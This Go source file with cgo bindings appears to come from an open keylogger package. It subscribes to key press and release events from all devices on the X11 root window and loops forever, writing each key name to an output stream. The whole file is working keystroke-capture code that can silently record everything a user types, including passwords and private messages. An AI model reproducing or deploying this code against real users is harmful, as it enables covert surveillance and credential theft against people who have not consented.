package input

/*
#cgo LDFLAGS: -lX11 -lXi

#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/XKBlib.h>
#include <X11/extensions/XInput.h>
#include <X11/extensions/XInput2.h>

int Macro_XIMaskLen(int event) {
	return XIMaskLen(event);
}

int Macro_XISetMask(unsigned char* ptr, int event) {
	return XISetMask(ptr, event);
}

unsigned char* allocate_mask(int len) {
	return calloc(len, sizeof(char));
}
*/
import "C"

import (
	"io"
	"unsafe"

	"github.com/nomad-software/keylogger/output"
)

// LogKeysTo reads all key presses and releases and writes them to the passed
// writer.
func LogKeysTo(w io.Writer) {
	display := C.XOpenDisplay(nil)

	var majorOpcodeReturn C.int
	var firstEventReturn C.int
	var firstErrorReturn C.int

	if C.XQueryExtension(display, C.CString("XInputExtension"), &majorOpcodeReturn, &firstEventReturn, &firstErrorReturn) == 0 {
		C.XCloseDisplay(display)
		output.Fatal("X Input extension not available")
	}

	screen := C.XDefaultScreen(display)
	window := C.XRootWindow(display, screen)
	masks := make([]C.XIEventMask, 1)

	// Define types of events.
	masks[0].deviceid = C.XIAllDevices
	masks[0].mask_len = C.Macro_XIMaskLen(C.XI_LASTEVENT)
	masks[0].mask = C.allocate_mask(masks[0].mask_len)
	C.Macro_XISetMask(masks[0].mask, C.XI_KeyPress)
	C.Macro_XISetMask(masks[0].mask, C.XI_KeyRelease)

	// Register events to be collected.
	C.XISelectEvents(display, window, &masks[0], (C.int)(len(masks)))
	C.XSync(display, 0)

	// Free mask.
	C.free(unsafe.Pointer(masks[0].mask))

	for {
		var event C.XEvent
		cookie := (*C.XGenericEventCookie)(unsafe.Pointer(&event))
		C.XNextEvent(display, &event)

		if C.XGetEventData(display, cookie) == 1 && cookie._type == C.GenericEvent && cookie.extension == majorOpcodeReturn {
			// Transform the event data into a readable string that indicates the key.
			data := (*C.XIDeviceEvent)(cookie.data)
			keyCode := (C.KeyCode)(data.detail)
			keySym := (C.KeySym)(C.XkbKeycodeToKeysym(display, keyCode, 0, 0))
			key := C.XKeysymToString(keySym)

			switch cookie.evtype {
			case C.XI_KeyPress:
				w.Write([]byte(substituteKeyPress(key)))
			case C.XI_KeyRelease:
				w.Write([]byte(substituteKeyRelease(key)))
			}
		}

		C.XFreeEventData(display, cookie)
	}
}
